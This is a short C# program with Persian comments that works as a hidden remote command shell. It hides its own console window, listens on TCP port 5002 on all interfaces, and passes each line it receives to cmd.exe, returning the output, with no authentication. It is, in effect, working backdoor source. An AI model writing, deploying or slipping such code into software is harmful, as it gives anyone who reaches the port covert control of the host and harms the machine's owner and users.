using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Text;
using System.Runtime.InteropServices;

class Server
{
    // Import the ShowWindow function from user32.dll
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0; // Hide the window

    static void Main()
    {
        // مخفی کردن پنجره کنسول
        Process currentProcess = Process.GetCurrentProcess();
        ShowWindow(currentProcess.MainWindowHandle, SW_HIDE);

        TcpListener server = new TcpListener(IPAddress.Any, 5002);
        server.Start();

        Console.WriteLine("Server started. Waiting for clients...");

        while (true)
        {
            TcpClient client = server.AcceptTcpClient();
            Console.WriteLine("Client connected.");
            HandleClient(client);
        }
    }

    static void HandleClient(TcpClient client)
    {
        using (NetworkStream stream = client.GetStream())
        using (StreamReader reader = new StreamReader(stream))
        using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true })
        {
            while (true)
            {
                // دریافت دستور از کلاینت
                string command = reader.ReadLine();
                if (command == null || command.ToLower() == "exit") break; // قطع اتصال با "exit"

                Console.WriteLine("Received command: " + command);

                // اجرای دستور و دریافت نتیجه
                ProcessStartInfo processInfo = new ProcessStartInfo("cmd.exe", "/c " + command);
                processInfo.RedirectStandardOutput = true;
                processInfo.UseShellExecute = false;
                processInfo.CreateNoWindow = true;
                processInfo.WindowStyle = ProcessWindowStyle.Hidden; // مخفی کردن پنجره‌ی cmd

                using (Process process = Process.Start(processInfo))
                using (StreamReader processReader = process.StandardOutput)
                {
                    string line;
                    while ((line = processReader.ReadLine()) != null)
                    {
                        writer.WriteLine(line); // ارسال هر خط خروجی به کلاینت
                    }
                    writer.WriteLine("END_OF_MESSAGE"); // نشان پایان پیام
                }

                Console.WriteLine("Sent result back to client.");
            }
        }
        client.Close();
    }
}
